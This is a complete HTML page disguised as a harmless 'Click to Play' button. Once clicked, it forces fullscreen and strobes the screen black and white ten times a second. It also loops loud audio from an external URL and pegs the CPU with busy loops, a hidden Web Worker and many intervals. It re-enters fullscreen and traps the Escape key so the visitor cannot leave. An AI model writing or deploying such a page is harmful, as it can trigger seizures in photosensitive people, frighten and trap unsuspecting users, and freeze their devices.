<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Click to Play</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: black;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow: hidden;
            user-select: none;
        }
        #playBtn {
            padding: 30px 80px;
            font-size: 48px;
            font-weight: bold;
            border: 4px solid white;
            background: transparent;
            color: white;
            cursor: pointer;
            border-radius: 20px;
            transition: 0.15s;
            letter-spacing: 4px;
            z-index: 10;
        }
        #playBtn:hover {
            background: white;
            color: black;
            transform: scale(1.05);
        }
        #overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 999;
        }
    </style>
</head>
<body>

    <button id="playBtn">▶ PLAY</button>
    <div id="overlay"></div>

    <script>
        (function() {
            const btn = document.getElementById('playBtn');
            const overlay = document.getElementById('overlay');
            let audio = null;
            let colorInterval = null;
            let audioInterval = null;
            let lagInterval = null;
            let isPlaying = false;

            // Pre-create audio
            audio = new Audio('https://www.image2url.com/r2/default/audio/1781189273445-63fdf56a-4b63-4e73-a0a3-7b11d2754bf5.mp3');
            audio.preload = 'auto';
            audio.loop = false;
            audio.volume = 1.0;

            // --- LAG FUNCTION ---
            function induceLag() {
                // Spin the CPU with useless heavy operations
                const start = performance.now();
                // Intense loop for ~50ms to freeze the event loop
                while (performance.now() - start < 50) {
                    // Heavy string operations, regex, array churn
                    let s = '';
                    for (let i = 0; i < 10000; i++) {
                        s += Math.random().toString(36).repeat(5);
                        s = s.replace(/[aeiou]/gi, '');
                        s = s.split('').reverse().join('');
                    }
                    // Allocate and discard arrays
                    const big = new Array(50000).fill(null).map((_, idx) => ({
                        index: idx,
                        value: Math.random() * 100000,
                        hash: btoa(String(idx * Math.random()))
                    }));
                    // Force GC pressure with string concat
                    big.forEach(item => {
                        item.longStr = item.value.toString().repeat(200);
                    });
                }
            }

            function startTerror() {
                if (isPlaying) return;
                isPlaying = true;

                // Hide button
                btn.style.display = 'none';

                // Show overlay
                overlay.style.display = 'block';

                // 1. Fullscreen
                try {
                    if (document.documentElement.requestFullscreen) {
                        document.documentElement.requestFullscreen();
                    } else if (document.documentElement.webkitRequestFullscreen) {
                        document.documentElement.webkitRequestFullscreen();
                    } else if (document.documentElement.msRequestFullscreen) {
                        document.documentElement.msRequestFullscreen();
                    }
                } catch(e) {}

                // 2. Strobe background black/white every 0.1s
                let flashState = false;
                colorInterval = setInterval(() => {
                    flashState = !flashState;
                    overlay.style.backgroundColor = flashState ? 'white' : 'black';
                }, 100);

                // 3. Audio nonstop
                function playLoop() {
                    if (!isPlaying) return;
                    audio.currentTime = 0;
                    audio.play().catch(() => {});
                }
                playLoop();
                audio.addEventListener('ended', playLoop);
                audioInterval = setInterval(() => {
                    if (audio.paused && isPlaying) {
                        audio.currentTime = 0;
                        audio.play().catch(() => {});
                    }
                }, 500);

                // 4. LAG: Hammer the CPU every 100ms
                // This will cause frame drops, UI freezing, and overall lag
                lagInterval = setInterval(() => {
                    // Run multiple lag cycles per tick
                    for (let cycle = 0; cycle < 3; cycle++) {
                        induceLag();
                    }
                }, 100);

                // Also spawn a background Web Worker-style lag (inline via blob)
                try {
                    // Create inline blob worker that pegs a core
                    const workerBlob = new Blob([`
                        setInterval(function() {
                            // Infinite CPU burn in worker
                            var start = Date.now();
                            while (Date.now() - start < 200) {
                                var x = 0;
                                for (var i = 0; i < 1000000; i++) {
                                    x += Math.atan(Math.sqrt(i * Math.random()));
                                }
                                // String abuse
                                var s = '';
                                for (var j = 0; j < 5000; j++) {
                                    s += String.fromCharCode((j % 95) + 32);
                                    s = s.split('').sort(function() { return 0.5 - Math.random(); }).join('');
                                }
                            }
                        }, 50);
                    `], { type: 'application/javascript' });
                    const workerUrl = URL.createObjectURL(workerBlob);
                    const worker = new Worker(workerUrl);
                    // Store reference so GC doesn't kill it
                    window._lagWorker = worker;
                } catch(e) {
                    // Web Worker may fail in some contexts, fallback to main thread only
                }

                // Extra: spawn many intervals that do pointless work
                for (let i = 0; i < 20; i++) {
                    (function() {
                        const id = setInterval(() => {
                            // Heavy DOM access & modification (even though overlay is shown)
                            document.title = document.title + '';
                            const tmp = document.createElement('div');
                            tmp.style.display = 'none';
                            tmp.innerHTML = new Array(1000).join('x');
                            document.body.appendChild(tmp);
                            document.body.removeChild(tmp);
                        }, 50);
                        // Store so we can clear later if needed (but we won't)
                        if (!window._lagIntervals) window._lagIntervals = [];
                        window._lagIntervals.push(id);
                    })();
                }
            }

            btn.addEventListener('click', startTerror);

            // Prevent exiting fullscreen
            document.addEventListener('fullscreenchange', () => {
                if (!document.fullscreenElement && isPlaying) {
                    try { document.documentElement.requestFullscreen(); } catch(e) {}
                }
            });
            document.addEventListener('webkitfullscreenchange', () => {
                if (!document.webkitFullscreenElement && isPlaying) {
                    try { document.documentElement.webkitRequestFullscreen(); } catch(e) {}
                }
            });

            // Trap escape
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Escape' && isPlaying) {
                    e.preventDefault();
                    try {
                        if (document.documentElement.requestFullscreen) {
                            document.documentElement.requestFullscreen();
                        } else if (document.documentElement.webkitRequestFullscreen) {
                            document.documentElement.webkitRequestFullscreen();
                        }
                    } catch(ex) {}
                }
            });

            // Cleanup on unload
            window.addEventListener('beforeunload', () => {
                if (colorInterval) clearInterval(colorInterval);
                if (audioInterval) clearInterval(audioInterval);
                if (lagInterval) clearInterval(lagInterval);
                if (audio) { audio.pause(); audio.src = ''; }
                // Kill worker if exists
                if (window._lagWorker) {
                    window._lagWorker.terminate();
                }
                // Kill extra intervals
                if (window._lagIntervals) {
                    window._lagIntervals.forEach(id => clearInterval(id));
                }
                isPlaying = false;
            });

        })();
    </script>

</body>
</html>
